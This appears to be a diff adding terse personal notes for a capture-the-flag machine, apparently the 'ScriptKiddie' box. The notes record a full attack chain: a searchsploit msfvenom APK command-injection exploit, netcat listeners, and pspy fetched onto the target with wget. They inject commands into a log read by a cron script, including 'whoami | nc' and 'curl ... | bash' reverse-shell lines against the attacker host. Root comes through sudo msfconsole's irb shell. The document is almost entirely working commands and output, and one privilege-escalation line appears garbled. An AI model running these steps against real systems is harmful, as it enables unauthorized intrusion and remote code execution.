@@ -1,0 +1,103 @@
+10.129.95.150
+[
+	searchsploit:::  searchsploit msfvenom
+
+		Metasploit Framework 6.0.11 - msfvenom APK template command injection               | multiple/local/49491.py
+
+	 ...sploit:: -m multiple/local/49491.py
+
+	  :: mv  ./49491.py  ./msfvenom_exploit.py
+		:: python3  ./msfvenom_exploit.py
+				File "/usr/lib/python3.13/subprocess.py", line 1991, in _execute_child                                             
+						raise child_exception_type(errno_num, err_msg, err_filename) 
+				FileNotFoundError: [Errno 2] No such file or directory: 'jarsigner'
+				
+				solution::: sudo apt install default-jdk
+
+		:: python3  ./msfvenom_exploit.py
+
+				[+] Done! apkfile is at /tmp/tmp4cwcfdc3/evil.apk
+																/tmp/tmp4cwcfdc3/evil.apk   <<----
+
+	firefox:::  payloads  os: android  lhost: 127.0.0.1  Browser: /tmp/tmp4cwcfdc3/evil.apk  ->> GENERATE
+
+							RCE:::...<3 <3 <3
+
+	nc::: -nlvp 1234
+
+	
+	firefox::: --search  "pspy github"	 ,  https://github.com/DominicBreuker/pspy/releases
+
+								pspy64 <<--
+
+	::: chmod +x ./pspy64 && upx ./pspy64     ("reducir el peso del binario")
+
+	::: python3 -m http.server 80
+
+	trgd.kid::: wget http://$(mvnb --vpn)/pspy64
+
+	trgd.kid::: ./pspy64
+
+	trgd.kid::: cat /home/pwn/scanlosers.sh
+
+							log=/home/kid/logs/hackers
+							cd /home/pwn/
+
+							cat $log | cut -d' ' -f3- | sort -u | while read ip; do
+									sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
+							done
+
+							if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
+
+	
+	trgd.kid::: vim -c "set viminfo= | set noswapfile" /home/kid/html/app.py
+
+							f'[{datetime.datetime.now()}]'
+
+				python3::: import datetime; print(f'[{datetime.datetime.now()}]')
+
+							 :=>		[2026-02-19 09:25:13.511996]
+
+	trgd.kid::: echo "[2026-02-19 14:32:44.013314] 10.10.14.82; whoami | nc 10.10.14.82 789#" > ./hackers      ( /home/kid/logs/hackers )
+			 ::: nc -nlvp 789
+
+	trgd.kid::: echo "[2026-02-19 14:32:44.013314] 10.10.14.82; ping -c 4 -4 10.10.14.82 #" > ./hackers      ( /home/kid/logs/hackers )
+			 ::: tcpdump -i tun0 icmp -n
+
+	trgd.kid::: echo "[2026-02-19 14:32:44.013314] 10.10.14.82; whoami | curl 10.10.14.82 | bash #" > ./hackers
+			 ::: python3 -m http.server 80				"el index.html con el bash -i ...."
+			 ::: nc -nlvp 1234			<<-- index.html port:1234
+
+
+	trgd.pwn:::....<3
+	trgd.pwn::: sudo -l
+			(root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
+
+	trgd.pwn::: sudo /opt/metasploit-framework-6.0.9/msfconsole
+
+					msf6:: irb
+						:>> system("whoami")
+						:>> system("chmod u+x /bin/bash")    |||  :>> system("bash")
+
+
+	ROOT:::....<3 <3 <3
+	
+
+
+	{{{
+	:::
+
+	ROOT:::...?
+	}}}
+]
+
+{[
+	:::
+	 ::
+
+	{{{
+	:::
+
+	ROOT:::...?
+	}}}
+]}
